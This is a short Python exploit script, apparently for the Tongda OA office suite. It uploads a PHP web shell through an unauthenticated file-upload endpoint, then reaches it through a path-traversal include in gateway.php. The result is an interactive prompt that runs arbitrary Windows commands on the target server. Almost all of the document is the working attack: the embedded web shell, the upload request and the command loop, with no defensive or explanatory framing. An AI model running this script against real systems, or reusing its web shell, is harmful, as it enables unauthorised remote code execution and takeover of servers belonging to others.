import requests,sys

def poc():
    global url
    upload = url+"/ispirit/im/upload.php"
    cmdshell = """
    <?php
        $command=$_POST['cmd'];
        $wsh = new COM('WScript.shell');
        $exec = $wsh->exec("cmd /c ".$command);
        $stdout = $exec->StdOut();
        $stroutput = $stdout->ReadAll();
        echo $stroutput;
    ?>
    """
    files = {"ATTACHMENT": cmdshell}
    upload_post = {
        "UPLOAD_MODE":2,
        "P":123,
        "DEST_UID":2
        }
    r = requests.post(upload,upload_post,files=files)
    path = r.text
    path = path[path.find('@')+1:path.rfind('|')].replace("_","/").replace("|",".")
    return path
    
def exp():
    global url
    path = poc()
    headers = {
        "Content-Type":"application/x-www-form-urlencoded"
    }
    include = url+"/ispirit/interface/gateway.php"
    while 1:
        cmd = input("$ ")
        include_post = 'json={"url":"/general/../../attach/im/'+path+'"}&cmd=%s' % cmd
        req = requests.post(url=include, data=include_post,headers=headers)
        print(req.text)
        if cmd == 'exit':
            break

if __name__ == '__main__':
    try:
        url = sys.argv[1]
        print("""   

 ______   ___   ____    ____      ___     ____      ____      __    ___ 
|      | /   \ |    \  /    |    |   \   /    |    |    \    /  ]  /  _]
|      ||     ||  _  ||   __|    |    \ |  o  |    |  D  )  /  /  /  [_ 
|_|  |_||  O  ||  |  ||  |  |    |  D  ||     |    |    /  /  /  |    _]
  |  |  |     ||  |  ||  |_ |    |     ||  _  |    |    \ /   \_ |   [_ 
  |  |  |     ||  |  ||     |    |     ||  |  |    |  .  \\     ||     |
  |__|   \___/ |__|__||___,_|    |_____||__|__|    |__|\_| \____||_____|
                                                                        

        """)
        poc()
        exp()
    except:
        print("python "+sys.argv[0]+" http://127.0.0.1")
